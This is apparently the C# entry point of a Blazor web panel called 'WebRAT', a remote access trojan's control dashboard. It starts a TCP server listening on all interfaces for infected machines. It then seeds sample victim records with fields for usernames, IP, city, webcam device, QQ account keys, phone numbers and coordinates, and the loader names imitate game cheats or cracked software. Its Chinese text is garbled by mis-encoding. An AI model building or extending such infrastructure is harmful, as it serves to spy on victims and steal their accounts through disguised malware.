using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Web;
using Data;

namespace WebRAT
{
    public class Program
    {
        public static TCPServer server = new TCPServer("0.0.0.0", ServerSettings.Port);
        public static void Main(string[] args)
        {
            var builder = WebApplication.CreateBuilder(args);

            // Add services to the container.
            builder.Services.AddRazorPages();
            builder.Services.AddServerSideBlazor();

            var app = builder.Build();

            // Configure the HTTP request pipeline.
            if (!app.Environment.IsDevelopment())
            {
                app.UseExceptionHandler("/Error");
            }


            app.UseStaticFiles();

            app.UseRouting();

            app.MapBlazorHub();
            app.MapFallbackToPage("/_Host");

            server.Start();

            MainData.DeviceL.Add(new Device { DeviceName = "�豸A", UserName = "�û�1", IP = "192.168.0.1", City = "����", CameraDevice = "����ͷ1", InstallTime = "2024-08-26", LoaderName = "WNF�ƽ��.exe", QQNumber = "10001", ProcessID = "1234", XY = "123,456", PhoneNumber = "123456789", QQKey = "��Կ1", KeyType = "����1" });
            MainData.DeviceL.Add(new Device { DeviceName = "�豸B", UserName = "�û�2", IP = "192.168.0.2", City = "̨��", CameraDevice = "����ͷ2", InstallTime = "2024-08-26", LoaderName = "VAPE.exe", QQNumber = "12345", ProcessID = "4567", XY = "123,456", PhoneNumber = "123456789", QQKey = "��Կ1", KeyType = "����1" });
            MainData.DeviceL.Add(new Device { DeviceName = "�豸C", UserName = "�û�3", IP = "192.168.0.3", City = "Ī˹��", CameraDevice = "����ͷ3", InstallTime = "2024-08-26", LoaderName = "SF�ڲ��ƽ�.exe", QQNumber = "123456", ProcessID = "7890", XY = "123,456", PhoneNumber = "123456789", QQKey = "��Կ1", KeyType = "����1" });

            app.Run();

        }
    }
}